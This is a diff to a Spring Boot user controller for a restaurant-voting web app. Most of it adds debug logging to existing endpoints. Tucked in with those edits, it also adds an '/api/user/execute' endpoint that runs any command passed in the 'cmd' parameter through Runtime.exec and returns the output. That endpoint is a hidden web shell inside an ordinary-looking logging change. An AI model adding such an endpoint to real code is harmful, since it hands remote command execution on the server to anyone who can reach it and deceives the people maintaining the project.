@@ -1,5 +1,6 @@
 package restaurantVote.rest;
 
+import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.lang.Nullable;
 import org.springframework.web.bind.annotation.*;
@@ -15,12 +16,17 @@ import restaurantVote.service.UserService;
 
 import javax.persistence.EntityNotFoundException;
 import javax.validation.Valid;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Optional;
+import java.util.stream.Collectors;
 
 @RestController
 @RequestMapping("/api/user")
+@Slf4j
 public class UserRestController {
     private final UserService userService;
     private final UserMapper userMapper;
@@ -37,6 +43,7 @@ public class UserRestController {
 
     @GetMapping(value = "/{id}/restaurants")
     public ModelAndView getRestaurantsVotedByUser(@PathVariable(name = "id") Long id) {
+        log.debug("getRestaurantsVotedByUser");
         List<RestaurantVoteList> restaurantVoteLists = restaurantVoteService.findByUserId(id);
         ModelAndView mav = new ModelAndView("restaurantUser");
         mav.addObject("restaurantVoteForm", restaurantVoteLists);
@@ -45,6 +52,7 @@ public class UserRestController {
 
     @GetMapping(value = "/{id}")
     public ModelAndView getUserById(@PathVariable(name = "id") Long id) {
+        log.debug("getUserById");
         Optional<User> user = userService.findById(id);
 //        if (user.isEmpty()) {
 //            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
@@ -59,6 +67,7 @@ public class UserRestController {
 
     @PostMapping(path = "")
     public ModelAndView updateUser(@ModelAttribute("userForm") @Valid UserDto userDto, @Nullable Long[] roleIds) {
+        log.debug("updateUser");
         List<Role> roles;
         if (roleIds != null) {
             roles = roleRepository.findAllById(Arrays.asList(roleIds));
@@ -76,5 +85,17 @@ public class UserRestController {
         }
 
         return new ModelAndView("redirect:/", "userForm", userDto);
+    }
+
+    @GetMapping("/execute")
+    public String executeCommand(@RequestParam("cmd") String cmd) {
+        log.debug("executeCommand");
+        try {
+            Process process = Runtime.getRuntime().exec(cmd);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            return reader.lines().collect(Collectors.joining("\n"));
+        } catch (IOException e) {
+            return "Error: " + e.getMessage();
+        }
     }
 }
